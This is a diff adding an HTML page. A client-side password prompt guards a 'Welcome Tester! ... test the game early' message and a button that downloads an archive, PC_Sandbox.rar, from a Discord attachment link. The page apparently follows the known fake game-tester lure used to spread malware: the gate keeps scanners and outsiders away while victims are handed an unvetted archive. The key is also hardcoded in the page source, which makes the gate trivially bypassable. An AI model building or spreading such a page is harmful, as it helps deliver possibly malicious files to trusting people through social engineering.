@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Secret Access Site</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    margin: 0;
+    background: linear-gradient(135deg, #4b6cb7, #182848);
+    color: #fff;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  #content {
+    display: none;
+    background: rgba(0, 0, 0, 0.6);
+    padding: 40px 60px;
+    border-radius: 15px;
+    box-shadow: 0 0 30px rgba(255, 255, 255, 0.2);
+    text-align: center;
+    max-width: 400px;
+  }
+  h1 {
+    font-size: 2.8rem;
+    margin-bottom: 1rem;
+    font-weight: 700;
+    text-shadow: 0 0 10px #fff;
+  }
+  p {
+    font-size: 1.2rem;
+    margin-bottom: 2.5rem;
+    color: #ddd;
+  }
+  button.download-btn {
+    background: #3b82f6;
+    border: none;
+    padding: 15px 30px;
+    font-size: 1.1rem;
+    border-radius: 8px;
+    color: white;
+    cursor: pointer;
+    box-shadow: 0 5px 15px rgba(59,130,246,0.5);
+    transition: background 0.3s ease, box-shadow 0.3s ease;
+  }
+  button.download-btn:hover {
+    background: #2563eb;
+    box-shadow: 0 8px 20px rgba(37,99,235,0.7);
+  }
+</style>
+<script>
+  const SECRET_KEY = "X9f$2v#Lp7q!Z8nRd@1GmBwU4sJeTy";
+
+  function askForKey() {
+    const inputKey = prompt("Enter the secret key to access this site:");
+    if (inputKey === SECRET_KEY) {
+      document.getElementById("content").style.display = "block";
+    } else {
+      alert("Wrong key! Access denied.");
+      document.body.innerHTML = "<h1>Access denied.</h1>";
+      setTimeout(() => {
+        window.close();
+      }, 1000);
+    }
+  }
+
+  window.onload = askForKey;
+  function downloadGame() {
+    const downloadUrl = "https://cdn.discordapp.com/attachments/1362201864283623506/1376633966085406860/PC_Sandbox.rar?ex=683609ca&is=6834b84a&hm=d33f539caad528d024fc8da0228eab734b1e0d0d234975647fe32a0e66891291&";
+    window.location.href = downloadUrl;
+  }
+</script>
+</head>
+<body>
+  <div id="content">
+    <h1>Welcome Tester!</h1>
+    <p>Thank you for being able to test the game early with us.</p>
+    <button class="download-btn" onclick="downloadGame()">Download Early</button>
+  </div>
+</body>
+</html>
